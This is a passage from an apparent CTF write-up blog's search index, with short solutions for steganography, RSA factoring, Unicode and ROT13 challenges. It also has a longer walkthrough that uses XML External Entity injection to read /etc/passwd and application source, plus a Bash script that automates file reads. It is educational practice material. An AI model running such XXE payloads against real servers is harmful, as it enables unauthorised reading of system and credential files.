SQLi","time":2,"title":"Micro-CMS v1"},{"contents":"We are given an MP3 file called Milkshake.mp3. We can take a look at the printable strings or metadata:\n$ file Milkshake.mp3 Milkshake.mp3: Audio file with ID3 version 2.4.0, extended header, contains:MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo $ strings -20 Milkshake.mp3 The Neptunes Present-Clones-ADTRCK 000007A5 000006CA 00007311 000075EA 0001A567 0001A567 00008000 00008000 0000005C 0000005CCOMM 000007A5 000006CA 00007311 000075EA 0001A567 0001A567 00008000 00008000 0000005C 0000005CTPE1 Chad Hugo/Pharrell Williams !$\u0026),/257:=@CFHKMPSVY\\^adgiloqtwy|~ $ exiftool Milkshake.mp3 ExifTool Version Number : 12.42 File Name : Milkshake.mp3 Directory : . File Size : 1511 kB File Modification Date/Time : 2017:08:28 16:05:06+02:00 File Access Date/Time : File Inode Change Date/Time : File Permissions : -rw-rw-r-- File Type : MP3 File Type Extension : mp3 MIME Type : audio/mpeg MPEG Audio Version : 1 Audio Layer : 3 Sample Rate : 44100 Channel Mode : Joint Stereo MS Stereo : Off Intensity Stereo : Off Copyright Flag : False Original Media : True Emphasis : None VBR Frames : 1568 VBR Bytes : 1510503 VBR Scale : 100 Encoder : LAME3.99r Lame VBR Quality : 0 Lame Quality : 0 Lame Method : VBR (new/mtrh) Lame Low Pass Filter : 22.1 kHz Lame Bitrate : 32 kbps Lame Stereo Mode : Joint Stereo ID3 Size : 451 Warning : Invalid ID3 frame size Audio Bitrate : 295 kbps Duration : 0:00:41 (approx)  But nothing interesting at all. We can open the audio file in Audacity:\nIf we change to the spetrogram view, we will notice something strange:\nAnd if we zoom a bit, we will see the flag:\nThis technique does not break the audio file because the flag is set on high frequency values, and humans cannot distinguish frequencies higher than 20 kHz.\nAnyway, the flag is: HTB{str4wberry_milkshak3}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/milkshake/","section":"ctf","summary":"MP3 audio spectrogram inspection. Steganography","time":2,"title":"Milkshake"},{"contents":"We are given the output of an RSA encryption:\nDecrypt my super sick RSA: c: 240986837130071017759137533082982207147971245672412893755780400885108149004760496 n: 831416828080417866340504968188990032810316193533653516022175784399720141076262857 e: 65537  RSA background RSA works so that, given a message $m$ in decimal format, we can encrypt it as follows:\n$$ c = m^e \\pmod{n} $$\nAnd the decryption needs two more values: $\\phi(n) = (p - 1) (q - 1)$ and $d = e^{-1} \\pmod{\\phi(n)}$, so that:\n$$ m = c^d \\pmod{n} $$\nVulnerability The modulus $n$ is quite short, and thus it can be factored easily. We can find factors $p$ and $q$ in factor.db:\nHaving $p$ and $q$ is enough to decrypt RSA, because we can compute $\\phi(n)$ and $d$.\nFlag $ python3 -q \u0026gt;\u0026gt;\u0026gt; c = 240986837130071017759137533082982207147971245672412893755780400885108149004760496 \u0026gt;\u0026gt;\u0026gt; n = 831416828080417866340504968188990032810316193533653516022175784399720141076262857 \u0026gt;\u0026gt;\u0026gt; e = 65537 \u0026gt;\u0026gt;\u0026gt; p = 1593021310640923782355996681284584012117 \u0026gt;\u0026gt;\u0026gt; q = 521911930824021492581321351826927897005221 \u0026gt;\u0026gt;\u0026gt; assert n == p * q \u0026gt;\u0026gt;\u0026gt; phi_n = (p - 1) * (q - 1) \u0026gt;\u0026gt;\u0026gt; d = pow(e, -1, phi_n) \u0026gt;\u0026gt;\u0026gt; m = pow(c, d, n) \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'picoCTF{sma11_N_n0_g0od_23540368}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/cryptography/mind-your-ps-and-qs/","section":"ctf","summary":"picoCTF 2021. 20 points. Factorization. RSA decryption","time":1,"title":"Mind your Ps and Qs"},{"contents":"We are given a flag.txt file that contains some Unicode characters. This is the hexdump of the file:\n$ xxd flag.txt 00000000: 69e2 808e 63e2 80ae 74e2 808e 66e2 80ae i...c...t...f... 00000010: 7be2 808e e280 8e75 6e31 6330 e280 ae64 {......un1c0...d 00000020: 655f 6de2 80ae 3467 3163 5f6e 61e2 808e e_m...4g1c_na... 00000030: e280 ae68 e280 8e73 e280 ae64 e280 ae66 ...h...s...d...f 00000040: 6fe2 80ae e280 8e61 7369 e280 8e68 e280 o......asi...h.. 00000050: aee2 80ae 6466 e280 8e61 736f 68e2 80ae ....df...asoh... 00000060: e280 8e64 666f 69e2 808e 6173 6864 66e2 ...dfoi...ashdf. 00000070: 808e e280 aee2 808e 6ae2 808e e280 ae6b ........j......k 00000080: e280 8e61 e280 8ee2 80ae e280 8e64 e280 ...a.........d.. 00000090: 8e73 e280 aee2 80ae 6866 e280 aee2 808e .s......hf...... 000000a0: 6c6a e280 ae61 64e2 80ae e280 8ee2 80ae lj...ad......... 000000b0: 73e2 80ae 66e2 808e 6864 736b 6ce2 80ae s...f...hdskl... 000000c0: 61e2 808e e280 ae68 e280 8e66 6ce2 80ae a......h...fl... 000000d0: e280 aee2 808e 6be2 80ae 686a e280 8ee2 ......k...hj.... 000000e0: 808e e280 ae64 e280 8ee2 808e e280 aee2 .....d.......... 000000f0: 80ae e280 ae61 e280 8ee2 808e 6673 7d0a .....a......fs}.  We can use some shell scripting to take the last column and remove al the . characters, so that we get the flag:\n$ xxd flag.txt | awk 'NF { print $NF }' | tr -d .\\\\n ictf{un1c0de_m4g1c_nahsdfoasihdfasohdfoiashdfjkadshfljadsfhdsklahflkhjdafs}  Anyway, using a shell like Zsh, we can simply use cat to show the flag:\n$ catn flag.txt ictf{un1c0de_m4g1c_nahsdfoasihdfasohdfoiashdfjkadshfljadsfhdsklahflkhjdafs}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/mixup/","section":"ctf","summary":"ImaginaryCTF 03/08/2022. 30 points. Unicode characters","time":2,"title":"mixup"},{"contents":"We are given a ciphertext:\ncvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX}  We see that the message has more or less the format of a picoCTF flag (picoCTF{...}), due to the fact that there are 4 lowercase and 3 uppercase letters before {, and ends with }. Moreover, there are several _.\nIt seems clear that the encryption is based on a substitution algorithm (Caesar cipher). The most common algorithm is ROT13. Using CyberChef, we can decrypt the message using ROT13 and read the flag:\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/cryptography/mod-26/","section":"ctf","summary":"picoCTF 2021. 10 points. Substitution cipher. ROT13","time":1,"title":"Mod 26"},{"contents":"We have a simple website that requests a code to unlock:\nWe can put any number we want, and after a few seconds, we see it is incorrect:\nThere is nothing in the source code of the website. At this point, we can apply fuzzing to enumerate more routes if they exist:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13]  There is an /admin route:\nThe source code for this page contains useful information:\nIf we go to /get-config, we will see an XML document:\n$ curl http://35.190.155.168/c33a5d03b6/get-config \u0026lt;?xml version=\"1.0\" encoding=\"UTF-8\"?\u0026gt;\u0026lt;config\u0026gt;\u0026lt;location\u0026gt;Front door\u0026lt;/location\u0026gt;\u0026lt;/config\u0026gt;  The output is in XML, so this might be vulnerable to XML External Entity (XXE) injection. If there is a /get-config, it is likely that there is also a /set-config route:\n$ curl http://35.190.155.168/c33a5d03b6/set-config \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The browser (or proxy) sent a request that this server could not understand.\u0026lt;/p\u0026gt;  We obtain a 400 Bad Request, so probably we need to add some query parameters (for GET) or request body (using POST):\n$ curl 'http://35.190.155.168/c33a5d03b6/set-config?location=asdf' \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The browser (or proxy) sent a request that this server could not understand.\u0026lt;/p\u0026gt; $ curl http://35.190.155.168/c33a5d03b6/set-config -d location=asdf \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;405 Method Not Allowed\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Method Not Allowed\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The method is not allowed for the requested URL.\u0026lt;/p\u0026gt;  It does not seem to be a POST request. Since the parameter location does not work, we can try to fuzz the parameter name using ffuf and filtering 400 status code:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u 'http://35.190.155.168/c33a5d03b6/set-config?FUZZ=asdf' -mc all -fc 400 data [Status: 500, Size: 291, Words: 38, Lines: 5]  If the parameter is called data we obtain a 500 Internal Server Error:\n$ curl 'http://35.190.155.168/c33a5d03b6/set-config?data=asdf' \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;500 Internal Server Error\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Internal Server Error\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.\u0026lt;/p\u0026gt;  Let\u0026rsquo;s try putting the XML document of /get-config in the data parameter, but changing the location tag by asdf:\n$ curl http://35.190.155.168/c33a5d03b6/set-config -G --data-urlencode 'data=\u0026lt;?xml version=\"1.0\" encoding=\"UTF-8\"?\u0026gt;\u0026lt;config\u0026gt;\u0026lt;location\u0026gt;asdf\u0026lt;/location\u0026gt;\u0026lt;/config\u0026gt;' \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You should be redirected automatically to target URL: \u0026lt;a href=\"admin\"\u0026gt;admin\u0026lt;/a\u0026gt;. If not click the link. $ curl http://35.190.155.168/c33a5d03b6/admin \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Model E1337 \u0026amp;mdash; Home\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Admin Panel\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Lock location: \u0026lt;input type=\"text\" name=\"location\" value=\"asdf\" disabled\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;!-- We should be using get-config for this on the client side. --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ curl http://35.190.155.168/c33a5d03b6/admin -s | grep asdf \u0026lt;p\u0026gt;Lock location: \u0026lt;input type=\"text\" name=\"location\" value=\"asdf\" disabled\u0026gt;\u0026lt;/p\u0026gt;  And the value inside /admin has changed. Now, we can enter another XML document to read files using an XML External Entity like this:\n\u0026lt;?xml version=\"1.0\"?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u0026gt; ]\u0026gt; \u0026lt;config\u0026gt; \u0026lt;location\u0026gt;\u0026amp;xxe;\u0026lt;/location\u0026gt; \u0026lt;/config\u0026gt;  $ curl http://35.190.155.168/c33a5d03b6/set-config -G --data-urlencode 'data=\u0026lt;?xml version=\"1.0\"?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u0026gt; ]\u0026gt;\u0026lt;config\u0026gt;\u0026lt;location\u0026gt;\u0026amp;xxe;\u0026lt;/location\u0026gt;\u0026lt;/config\u0026gt;' \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You should be redirected automatically to target URL: \u0026lt;a href=\"admin\"\u0026gt;admin\u0026lt;/a\u0026gt;. If not click the link. $ curl http://35.190.155.168/c33a5d03b6/admin \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Model E1337 \u0026mdash; Home\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Admin Panel\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Lock location: \u0026lt;input type=\"text\" name=\"location\" value=\"root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/bin/sh man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin postgres:x:70:70::/var/lib/postgresql:/bin/sh cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin \" disabled\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;!-- We should be using get-config for this on the client side. --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  And we obtain the file /etc/passwd from the server. At this point, we can create a simple Bash script to pass the absolute path of a file and print its contents if it exists, just to automate the process:\n#!/usr/bin/env bash url=$1 file=$2 xml=\"\u0026lt;?xml version=\\\"1.0\\\"?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \\\"file://$file\\\"\u0026gt; ]\u0026gt; \u0026lt;config\u0026gt; \u0026lt;location\u0026gt; BEGINTAG \u0026amp;xxe; ENDTAG \u0026lt;/location\u0026gt; \u0026lt;/config\u0026gt;\" curl $url/set-config -G --data-urlencode \"data=$xml\" \u0026amp;\u0026gt;/dev/null res=$(curl $url/admin -s) begin=$(( $(echo \"$res\" | grep -n BEGINTAG | awk -F : '{ print $1 }') + 1 )) end=$(( $(echo \"$res\" | grep -n ENDTAG | awk -F : '{ print $1 }') - 1 )) echo -n \"$res\" | sed -n \"${begin},${end}p\"  Now with this Bash script we can read files from the server specifying the absolute path:\n$ bash xxe.sh http://35.190.155.168/c33a5d03b6 /etc/hosts 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.18.0.20 c33a5d03b6b4  Although we know the server has nginx configured, we cannot show configuration files such as /etc/nginx/nginx.conf or /etc/nginx/sites-enabled/default.\nHowever, we can guess that the server is running Flask (a Python web framework) because the HTTP response status messages are in capital letters:\n$ curl http://35.190.155.168/c33a5d03b6/doesnotexist -I HTTP/1.1 404 NOT FOUND Server: nginx/1.14.0 (Ubuntu) Date: Content-Type: text/html Content-Length: 233 Connection: keep-alive Cache-Control: public, max-age=0 Pragma: no-cache Expires: 0  And so, we can guess that the principal file for the back-end source code is app.py, main.py, index.py or server.py. And for directories, we may try with /app (usual in Docker containers). In the end, what works is /app/main.py. This is the file:\n$ bash xxe.sh http://35.190.155.168/c33a5d03b6 /app/main.py  import json, os, time, xml.sax from flask import Flask, redirect, request from jinja2 import Template from cStringIO import StringIO from rng import * # ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$ flags = json.loads(os.getenv('FLAGS')) os.unsetenv('FLAGS') app = Flask(__name__) templateCache = {} def render(tpl, **kwargs): if tpl not in templateCache: templateCache[tpl] = Template(file('templates/%s.html' % tpl).read()) return templateCache[tpl].render(**kwargs) @app.after_request def add_header(r): r.headers[\"Cache-Control\"] = \"no-cache, no-store, must-revalidate\" r.headers[\"Pragma\"] = \"no-cache\" r.headers[\"Expires\"] = \"0\" r.headers['Cache-Control'] = 'public, max-age=0' return r @app.route('/') def index(): return render('home') @app.route('/unlock', methods=['POST']) def unlock(): code = int(request.form['code']) cur = next(26) time.sleep(5) if code == cur: return 'Unlocked successfully. Flag: ' + flags[1] else: return 'Code incorrect. Expected %08i' % cur @app.route('/admin') def admin(): return render('admin', location=location) location = 'Front door' @app.route('/get-config') def getConfig(): return '\u0026lt;?xml version=\"1.0\" encoding=\"UTF-8\"?\u0026gt;\u0026lt;config\u0026gt;\u0026lt;location\u0026gt;%s\u0026lt;/location\u0026gt;\u0026lt;/config\u0026gt;' % location class Handler(xml.sax.ContentHandler): def __init__(self): self.location = None def startElement(self, name, attrs): if name == 'location': self.location = '' def endElement(self, name): if name == 'location': global location location = self.location self.location = None def characters(self, content): if self.location is not None: self.location += content @app.route('/set-config') def setConfig(): data = request.args['data'] parser = xml.sax.make_parser() parser.setContentHandler(Handler()) parser.parse(StringIO(data)) return redirect('admin') app.run(host='0.0.0.0', port=80)  The file contains a comment with the first flag.\nNow we can analyze the function that handles the locker shown on the main website:\n@app.route('/unlock', methods=['POST']) def unlock(): code = int(request.form['code']) cur = next(26) time.sleep(5) if code == cur: return 'Unlocked successfully. Flag: ' + flags[1] else: return 'Code incorrect. Expected %08i' % cur  The function called next is not the built-in one. In fact it is taken from rng:\nfrom rng import *  So there must be a file called rng.py, which is this one:\n$ bash xxe.sh http://35.190.155.168/c33a5d03b6 /app/rng.py  import random def setup(seed): global state state = 0 for i in range(16): cur = seed \u0026amp; 3 seed \u0026gt;\u0026gt;= 2 state = (state \u0026lt;\u0026lt; 4) | ((state \u0026amp; 3) ^ cur) state |= cur \u0026lt;\u0026lt; 2 def next(bits): global state ret = 0 for _ in range(bits): ret \u0026lt;\u0026lt;= 1 ret |= state \u0026amp; 1 state = (state \u0026lt;\u0026lt; 1) ^ (state \u0026gt;\u0026gt; 61) state \u0026amp;= 0xFFFFFFFFFFFFFFFF state ^= 0xFFFFFFFFFFFFFFFF for j in range(0, 64, 4): cur = (state \u0026gt;\u0026gt; j) \u0026amp; 0xF cur = (cur \u0026gt;\u0026gt; 3) | ((cur \u0026gt;\u0026gt; 2) \u0026amp; 2) | ((cur \u0026lt;\u0026lt; 3) \u0026amp; 8) | ((cur \u0026lt;\u0026lt; 2) \u0026amp; 4) state ^= cur \u0026lt;\u0026lt; j return ret setup((random.randrange(0x10000) \u0026lt;\u0026lt; 16) | random.randrange(0x10000))  This file is used to generate the rolling codes. We must obtain the next code provided one or more previous codes, or at least extract the initial seed in order to be able to generate valid rolling codes for the lock.\nThe script is using three important variables:\n seed: The initial seed. It is completely random, and it is computed as:  seed = (random.randrange(0x10000) \u0026lt;\u0026lt; 16) | random.randrange(0x10000)   ret: It is the next rolling code. It is computed using a state variable. Basically, it is taking the last bit of state and putting it at the end of ret during 26 iterations. However, state changes on each iteration:  ret = 0 for _ in range(26): ret \u0026lt;\u0026lt;= 1 ret |= state \u0026amp; 1 # Changes in state   state: It is initially generated by the seed as:  state = 0 for i in range(16): cur = seed \u0026amp; 3 seed \u0026gt;\u0026gt;= 2 state = (state \u0026lt;\u0026lt; 4) | ((state \u0026amp; 3) ^ cur) state |= cur \u0026lt;\u0026lt; 2  But this is not useful since the seed is random. We see that the state changes on each execution of next, and actually, on each of the 26 iterations within a single call to next:\nfor _ in range(26): # Changes in ret state = (state \u0026lt;\u0026lt; 1) ^ (state \u0026gt;\u0026gt; 61) state \u0026amp;= 0xFFFFFFFFFFFFFFFF state ^= 0xFFFFFFFFFFFFFFFF for j in range(0, 64, 4): cur = (state \u0026gt;\u0026gt; j) \u0026amp; 0xF cur = (cur \u0026gt;\u0026gt; 3) | ((cur \u0026gt;\u0026gt; 2) \u0026amp; 2) | ((cur \u0026lt;\u0026lt; 3) \u0026amp; 8) | ((cur \u0026lt;\u0026lt; 2) \u0026amp; 4) state ^= cur \u0026lt;\u0026lt; j  First, we have this operation (using a 64-bit integer as an array of bits):\n$$ \\mathrm{state} = [s_{63}, s_{62}, s_{61}, s_{60}, \\dots, s_2, s_1, s_0] $$\n$$ \\mathrm{state} = [s_{62}, s_{61}, s_{60}, \\dots, s_2, s_1, s_0, 0] \\hat{} [0, 0, 0, \\dots, 0, s_{63}, s_{62}, s_{61}] $$\n$$ \\mathrm{state} = [s_{62}, s_{61}, s_{60}, \\dots, s_2, (s_1 \\hat{} s_{63}), (s_0 \\hat{} s_{62}), s_{61}] $$\n$$ \\mathrm{state} = [\\overline{s_{62}}, \\overline{s_{61}}, \\overline{s_{60}}, \\dots, \\overline{s_2}, \\overline{(s_1 \\hat{} s_{63})}, \\overline{(s_0 \\hat{} s_{62})}, \\overline{s_{61}}] $$\nAnd now, we have operations for every 4 bits of state (set into cur). For example:\n$$ \\mathrm{cur} = [s_3, s_2, s_1, s_0] $$\n$$ \\mathrm{cur} = [0, 0, 0, s_3] \\quad|\\quad [0, 0, s_3, 0] \\quad|\\quad [s_0, 0, 0, 0] \\quad|\\quad [0, s_0, 0, 0] $$\n$$ \\mathrm{cur} = [s_0, s_0, s_3, s_3] $$\n$$ \\mathrm{state}[3..0] = [s_3, s_2, s_1, s_0] \\hat{} [s_0, s_0, s_3, s_3] $$\nSo that the state is changed like this:\n$$ \\mathrm{state}[3..0] = [(s_3 \\hat{} s_0), (s_2 \\hat{} s_0), (s_1 \\hat{} s_3), (s_0 \\hat{} s_3)] $$\nAnd therefore, the whole state variable changes in this way (notice that in every quartet, the first and last bits are equal):\n$$ \\mathrm{state}[63..60] = [(s_{63} \\hat{} s_{60}), (s_{62} \\hat{} s_{60}), (s_{61} \\hat{} s_{63}), (s_{60} \\hat{} s_{63})] $$\n$$ \\mathrm{state}[59..56] = [(s_{59} \\hat{} s_{56}), (s_{58} \\hat{} s_{56}), (s_{59} \\hat{} s_{59}), (s_{56} \\hat{} s_{59})] $$\n$$ \\dots $$\n$$ \\mathrm{state}[3..0] = [(s_3 \\hat{} s_0), (s_2 \\hat{} s_0), (s_1 \\hat{} s_3), (s_0 \\hat{} s_3)] $$\nFinally, if we join both stages for the change in state we have this:\n$$ \\mathrm{state} = [s_{63}, s_{62}, s_{61}, s_{60}, \\dots, s_2, s_1, s_0] $$\nAnd the next state will be:\n$$ \\mathrm{state} = [(\\overline{s_{62}} \\hat{} \\overline{s_{59}}), (\\overline{s_{61}} \\hat{} \\overline{s_{59}}), (\\overline{s_{60}} \\hat{} \\overline{s_{62}}), (\\overline{s_{59}} \\hat{} \\overline{s_{62}}), $$\n$$ (\\overline{s_{58}} \\hat{} \\overline{s_{55}}), (\\overline{s_{57}} \\hat{} \\overline{s_{55}}), (\\overline{s_{56}} \\hat{} \\overline{s_{58}}), (\\overline{s_{55}} \\hat{} \\overline{s_{58}}), $$\n$$ \\dots $$\n$$ (\\overline{s_6} \\hat{} \\overline{s_3}), (\\overline{s_5} \\hat{} \\overline{s_3}), (\\overline{s_4} \\hat{} \\overline{s_6}), (\\overline{s_3} \\hat{} \\overline{s_6}), $$\n$$ (\\overline{s_2} \\hat{} \\overline{s_{61}}), (\\overline{(s_1 \\hat{} s_{63})} \\hat{} \\overline{s_{61}}), (\\overline{(s_0 \\hat{} s_{62})} \\hat{} \\overline{s_2}), (\\overline{s_{61}} \\hat{} \\overline{s_2})] $$\nNotice that $\\overline{a} \\hat{} \\overline{b} = a \\hat{} b$, so the next state can be simplified to:\n$$ \\mathrm{state} = [(s_{59} \\hat{} s_{62}), (s_{59} \\hat{} s_{61}), (s_{60} \\hat{} s_{62}), (s_{59} \\hat{} s_{62}), $$\n$$ (s_{55} \\hat{} s_{58}), (s_{55} \\hat{} s_{57}), (s_{56} \\hat{} s_{58}), (s_{55} \\hat{} s_{58}), $$\n$$ \\dots $$\n$$ (s_3 \\hat{} s_6), (s_3 \\hat{} s_5), (s_4 \\hat{} s_6), (s_3 \\hat{} s_6), $$\n$$ (s_2 \\hat{} s_{61}), (s_1 \\hat{} s_{61} \\hat{} s_{63}), (s_0 \\hat{} s_2 \\hat{} s_{62}), (s_2 \\hat{} s_{61})] $$\nRemember that this new state is for the next iteration of the rolling code algorithm. We could continue like this until the last iteration, but it will be really big. Instead, we can create a 64x64 matrix that, given a state, produces the next one (it is really big as well, but it is better to work with):\n$$ \\begin{pmatrix} 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 